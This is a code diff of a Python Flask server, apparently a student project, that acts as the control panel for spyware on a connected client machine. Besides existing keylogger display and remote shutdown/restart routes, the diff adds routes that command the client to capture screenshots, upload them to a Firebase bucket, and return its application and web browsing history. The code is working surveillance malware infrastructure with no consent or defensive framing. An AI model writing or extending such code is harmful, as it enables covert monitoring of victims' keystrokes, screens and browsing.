@@ -1,7 +1,19 @@
 import socket
+import os
+import time
 from flask import Flask, request, jsonify, render_template
 import sqlite3
 import threading
+from google.cloud import storage
+import firebase_admin
+from firebase_admin import credentials, storage
+
+# cred = credentials.Certificate("credentials.json")
+# firebase_admin.initialize_app(cred, {"storageBucket": "pbl4-09092003.appspot.com"})
+
+cred = credentials.Certificate("serviceAccountKey.json")
+firebase_admin.initialize_app(cred, {"storageBucket": "pbl4-09092003.appspot.com"})
+
 
 app = Flask(__name__)
 is_logged_in = False
@@ -79,10 +91,23 @@ def start_socket_server():
         print(f"Server error: {str(e)}")
     finally:
         server_socket.close()
-        
+
+def get_screenshots_list():
+    # Lấy tham chiếu đến bucket
+    bucket = storage.bucket()
+
+    # Lấy danh sách tất cả các đối tượng trong bucket
+    blobs = list(bucket.list_blobs())
+    
+    # Lọc các đối tượng để chỉ lấy các ảnh chụp màn hình
+    screenshots_list = [blob.public_url for blob in blobs if blob.name.startswith("screenshot")]
+
+    return screenshots_list
+
+    
 @app.route('/', methods=['GET', 'POST'])
 def login():
-    global is_logged_in  # Declare is_logged_in as a global variable
+    global is_logged_in  
 
     if request.method == 'POST':
         username = request.form['name']
@@ -122,9 +147,8 @@ def login():
 def keylogger_router():
     return render_template('keylogger.html', data_received=data_received)
 
-
 @app.route('/remote-control',methods=['GET','POST'])
-def remote_router():
+def remote_router():   
     if request.method == 'POST':
         data = request.get_json()
         action = data.get('action')
@@ -138,6 +162,79 @@ def remote_router():
             client_socket.send('restart'.encode('utf-8'))
             return jsonify(message='Đã thực hiện thành công hành động restart!')
 
-    return render_template('remote-control.html')  
+    return render_template('remote-control.html') 
+ 
+@app.route('/screenshots', methods=['GET', 'POST'])
+def screenshots_router():
+    image_url = ""
+    if request.method == 'POST':
+        data = request.get_json()
+        action = data.get('action')
+        print("Action: ", action)
+
+        if action == 'takeScreenshot':
+            client_socket.send('takeScreenshot'.encode('utf-8'))
+            try:
+                image_url = client_socket.recv(1024).decode('utf-8')
+                print("Received image URL:", image_url)
+                return jsonify({'image_url': image_url})
+            except Exception as e:
+                print("Error receiving image URL:", str(e))
+                return jsonify({'image_url': image_url})
+        elif action == 'showScreenshot':
+            bucket = storage.bucket()
+            blobs = bucket.list_blobs()
+
+            images = [{'name': os.path.basename(blob.name), 'public_url': blob.generate_signed_url(expiration=int(time.time()) + 3600)} for blob in blobs]
+            
+            return jsonify({'images': images})
+
+    return render_template('screenshots.html')
+
+
+@app.route('/show_image')
+def show_image():
+    # Lấy tham số từ query parameters
+    image_name = request.args.get('image_name')
+    image_url = request.args.get('image_url')
+
+    return render_template('show_image.html', image_name=image_name, image_url=image_url)
+
+@app.route('/delete_image/<image_name>', methods=['POST'])
+def delete_image(image_name):
+    try:
+        # Xoá ảnh từ Firebase Storage
+        bucket = storage.bucket()
+        blob = bucket.blob(f'images/{image_name}')
+        blob.delete()
+
+        return jsonify({'success': True})
+    except Exception as e:
+        print("Error deleting image:", str(e))
+        return jsonify({'success': False})
+  
+@app.route('/history',methods=['GET','POST'])
+def appHistory_router():
+    app = ""
+    if request.method == 'POST':
+        data = request.get_json()
+        action = data.get('action')
+        print("Action: " ,action)
+        
+        if action == 'appHistory':
+            client_socket.send('appHistory'.encode('utf-8'))
+            while True:
+                app = client_socket.recv(1024).decode('utf-8')
+                print(app, end = '\n')
+                return render_template('history.html', data=app) 
+        elif action == 'webHistory':
+            client_socket.send('webHistory'.encode('utf-8'))
+            while True:
+                web = client_socket.recv(1024).decode('utf-8')
+                print(web, end = '\n')
+                return render_template('history.html', data=web) 
+
+    return render_template('history.html')  
+
 if __name__ == '__main__':
     app.run(debug=True, port=8000)
